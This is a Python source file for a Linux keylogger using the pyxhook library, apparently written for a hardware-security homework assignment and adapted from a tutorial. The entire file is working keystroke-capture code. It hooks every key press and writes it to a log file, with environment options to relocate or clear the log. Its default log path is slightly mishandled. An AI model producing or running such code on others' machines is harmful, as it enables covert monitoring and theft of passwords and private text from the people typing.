#!/usr/bin/env python3
# Code from https://www.geeksforgeeks.org/design-a-keylogger-in-python/
# Code edited with guidance from ChatGPT
# Python code for keylogger 
# to be used in linux 
import os 
import pyxhook 
  
# This tells the keylogger where the log file will go. 
# You can set the file path as an environment variable ('pylogger_file'), 
# or use the default ~/tmp
default_log_dir = os.path.expanduser('Desktop/Hardware_Security/homework/homework3/file.log')
fallback_log_dir = '/tmp'

# Get log file from enviroment variable or default
log_file = os.environ.get( 
	'pylogger_file', 
	os.path.join(default_log_dir, 'file.log')
)

# Check if the directory for the log file exists, fallback to /tmp if it does not
log_dir = os.path.dirname(log_file)
if not os.path.exists(log_dir):
	# Use fallback directory if the default does not exist
	log_file = os.path.join(fallback_log_dir, 'file.log')

# Allow setting the cancel key from environment args, Default: ` 
cancel_key = ord( 
	os.environ.get( 
		'pylogger_cancel', 
		'`'
	)[0] 
) 
  
# Allow clearing the log file on start, if pylogger_clean is defined. 
if os.environ.get('pylogger_clean', None) is not None: 
	try: 
		os.remove(log_file) 
	except EnvironmentError: 
		# File does not exist, or no permissions. 
		pass
  
#creating key pressing event and saving it into log file 
def OnKeyPress(event): 
	with open(log_file, 'a') as f: 
		f.write('{}\n'.format(event.Key)) 
  
# create a hook manager object 
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress

# set the hook 
new_hook.HookKeyboard() 
try: 
	new_hook.start() # start the hook 
except KeyboardInterrupt: 
	# User cancelled from command line.
	print("Keylogger stopped.")
	pass
except Exception as ex: 
	# Write exceptions to the log file, for analysis later. 
	msg = 'Error while catching events:\n  {}'.format(ex) 
	pyxhook.print_err(msg) 
	with open(log_file, 'a') as f: 
		f.write('\n{}'.format(msg))
finally:
	# Ensure hooks are removed on exit
	new_hook.UnhookKeyboard()
	print("Hook has been removed.")

